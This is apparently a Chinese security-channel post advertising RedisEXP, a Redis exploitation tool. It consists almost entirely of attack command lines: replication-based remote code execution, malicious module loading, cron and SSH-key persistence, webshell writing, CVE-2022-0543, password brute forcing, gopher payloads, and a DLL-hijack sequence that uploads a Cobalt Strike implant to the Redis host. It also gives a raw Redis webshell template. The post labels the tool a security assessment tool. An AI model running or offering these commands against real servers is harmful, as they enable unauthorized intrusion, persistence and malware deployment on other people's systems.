#  【神兵利器】Redis漏洞综合利用工具   
yuyan-sec  七芒星实验室   2024-12-20 23:01  
  
项目介绍  
  
RedisEXP是一款针对Redis漏洞综合利用的安全评估工具  
  
工具使用  
  
详细信息查看  
```

██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝

基本连接: 
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456

执行Redis命令：
RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info

加载dll或so执行命令：
RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)
RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec

主从复制命令执行：
RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami -rf exp.so

主从复制上传文件：
RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件
RedisEXP.exe -m upload -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -rp . -rf 1.txt -lf .\README.md

主动关闭主从复制：
RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码

写计划任务：
RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
RedisEXP.exe -m cron -r 192.168.1.8 -p 6379 -L 192.168.1.8 -P 9001

写SSH 公钥：
RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥
RedisEXP.exe -m ssh -r 192.168.1.8 -p 6379 -u root -s ssh-aaaaaaaaaaaaaa

写webshell：
RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]
RedisEXP.exe -m shell -r 127.0.0.1 -p 6379 -rp . -rf shell.txt -s MTIzNA== -b

CVE-2022-0543：
RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令

爆破Redis密码：
RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典
RedisEXP.exe -m brute -r 127.0.0.1 -p 6378 -f pass.txt

生成gohper：
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件

执行 bgsave：
RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码

判断文件（需要绝对路径）：
RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini

```  
  
备注说明：  
- exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。  
  
- 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码  
  
- 有空格的命令、目录或文件直接使用双引号即可 "ls /"  
  
- 关闭Redis压缩(写入乱码的时候可以关闭压缩，工具在写入shell的时候默认添加了关闭压缩，写入后再恢复开启压缩)  
  
```
config set rdbcompression no
```  
  
- stop-writes-on-bgsave-error 默认为 yes, 如果 Redis 开启了 RDB 持久化并且最后一次失败了，Redis 默认会停止写入，让用户意识到数据的持久化没有正常工作。临时的解决方案是 conf set stop-writes-on-bgsave-error 设置为 no，只是让程序暂时忽略了这个问题，但是数据的持久化的问题并没有。（工具会默认设置为 no ，等工具退出的时候再重新设置回原来的值yes）  
  
  
```
config set stop-writes-on-bgsave-error no
```  
  
dll劫持  
  
利用dbghelp.dll：https://github.com/P4r4d1se/dll_hijack  
```
上传 cs 马
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp c:\users\public -rf test.exe  -lf artifact.exe

上传 dbghelp.dll 到 redis-server.exe 所在目录进行劫持
.\RedisEXP.exe -m upload -r 127.0.0.1 -p 6378 -w 123456 -L 127.0.0.1 -P 2222 -rp . -rf dbghelp.dll  -lf dbghelp.dll

触发dll劫持
.\RedisEXP.exe -m bgsave -r 127.0.0.1 -p 6378 -w 123456
```  
  
生成Gophers：  
```
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件
```  
  
写shell模板：  
```
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
bgsave
```  
  
**下载地址**  
  
**点击下方名片进入公众号**  
  
**回复关键字【**  
**241221****】获取**  
**下载链接**  
  
**·推 荐 阅 读·**  
  
# 最新后渗透免杀工具  
# 【护网必备】高危漏洞综合利用工具  
# 【护网必备】Shiro反序列化漏洞综合利用工具增强版  
# 【护网必备】外网打点必备-WeblogicTool  
# 【护网必备】最新Struts2全版本漏洞检测工具  
# Nacos漏洞综合利用工具  
# 重点OA系统漏洞利用综合工具箱    
# 【护网必备】海康威视RCE批量检测利用工具  
# 【护网必备】浏览器用户密码|Cookie|书签|下载记录导出工具  
  
  
  
